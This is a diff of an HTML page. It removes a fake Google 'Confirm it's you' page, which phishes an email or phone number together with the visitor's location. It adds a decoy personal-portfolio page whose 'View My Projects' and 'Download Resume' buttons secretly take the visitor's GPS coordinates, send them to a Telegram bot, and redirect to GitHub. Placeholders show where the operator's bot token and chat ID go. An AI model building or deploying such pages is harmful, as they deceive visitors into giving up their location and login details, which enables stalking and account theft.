@@ -1,72 +1,71 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
+    <title>My Personal Portfolio</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { max-width: 380px; width: 90%; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 25px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
-        #status { margin-top: 15px; font-size: 13px; color: #d93025; display: none; }
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+        body { font-family: 'Poppins', sans-serif; background: #0f172a; color: white; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
     </style>
 </head>
-<body>
+<body class="flex items-center justify-center min-h-screen p-4">
 
-<div class="card">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <h1>Confirm it's you</h1>
-    <p>To help keep your account secure, Google needs to verify your current location.</p>
-    
-    <input type="text" id="user_id" placeholder="Email or phone" required>
-    <button class="btn" onclick="startCapture()">Next & Verify</button>
-    
-    <div id="status">Verifying... Please allow location access.</div>
-</div>
+    <div class="glass max-w-md w-full rounded-2xl p-8 text-center shadow-2xl">
+        <div class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-blue-500 p-1">
+            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix" class="rounded-full bg-slate-700">
+        </div>
+        
+        <h1 class="text-2xl font-bold mb-2">Hey, I'm Ajit! 👋</h1>
+        <p class="text-slate-400 text-sm mb-6">Full Stack Developer | UI/UX Designer | Tech Enthusiast</p>
 
-<script>
-    // --- APNI DETAILS YAHAN DALO ---
-    const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"; 
-    const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
+        <div class="space-y-4">
+            <button onclick="start()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-300 shadow-lg">
+                View My Projects
+            </button>
+            
+            <button onclick="start()" class="w-full glass hover:bg-white/10 text-white font-semibold py-3 rounded-lg transition duration-300">
+                Download Resume
+            </button>
+        </div>
 
-    function startCapture() {
-        const info = document.getElementById('user_id').value;
-        const status = document.getElementById('status');
+        <div class="mt-8 pt-6 border-t border-white/10 flex justify-center space-x-6 text-slate-400">
+            <span>Insta</span>
+            <span>GitHub</span>
+            <span>LinkedIn</span>
+        </div>
 
-        if (!info) {
-            alert("Please enter your Email or Phone.");
-            return;
-        }
+        <p id="status" class="mt-4 text-xs text-blue-400 hidden italic">Connecting to secure server...</p>
+    </div>
 
-        status.style.display = "block";
+    <script>
+        // --- APNI DETAILS YAHAN DALO ---
+        const BOT_TOKEN = "TUMHARA_TOKEN_YAHAN";
+        const CHAT_ID = "TUMHARI_CHAT_ID_YAHAN";
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                
-                const message = `📍 *Target Hit!*%0A%0A👤 *User:* ${info}%0A🌐 *Lat:* ${lat}%0A🌐 *Lon:* ${lon}%0A🗺️ *Maps:* https://www.google.com/maps?q=${lat},${lon}`;
+        function start() {
+            document.getElementById('status').classList.remove('hidden');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    const msg = `🔥 *New Portfolio Hit!*%0A%0A📍 *Lat:* ${lat}%0A📍 *Lon:* ${lon}%0A🗺️ *Maps:* https://www.google.com/maps?q=${lat},${lon}`;
 
-                // Sending to Telegram
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`)
-                .then(() => {
-                    alert("Verification Successful!");
-                    window.location.href = "https://myaccount.google.com";
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
+                    .then(() => {
+                        // Redirect user to real content after hit
+                        window.location.href = "https://github.com"; 
+                    });
+
+                }, function(err) {
+                    alert("Please allow permission to view portfolio content.");
                 });
-
-            }, function(error) {
-                status.innerText = "Error: Location access is required for verification.";
-            }, { enableHighAccuracy: true });
-        } else {
-            alert("Browser not supported.");
+            }
         }
-    }
-</script>
-
+    </script>
 </body>
 </html>
